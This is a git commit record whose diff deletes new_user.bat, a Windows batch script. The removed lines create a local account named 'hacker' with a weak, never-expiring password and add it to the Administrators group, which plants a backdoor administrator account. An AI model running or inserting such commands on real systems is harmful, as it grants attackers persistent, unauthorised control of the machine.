ef31d5e6f85629bf8f67cb4837c857ff5e3d5912
binaryAccess <binaryAccess@users.noreply.github.com>
2018-04-30 17:35:28 +0200

    Delete new_user.bat

--- new_user.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-net user hacker pw123 /add /comment:"COMMENT" /passwordchg:NO
-wmic useraccount where "name='hacker'" set passwordexpires=FALSE
-net localgroup "Administrators" hacker /add
-exit
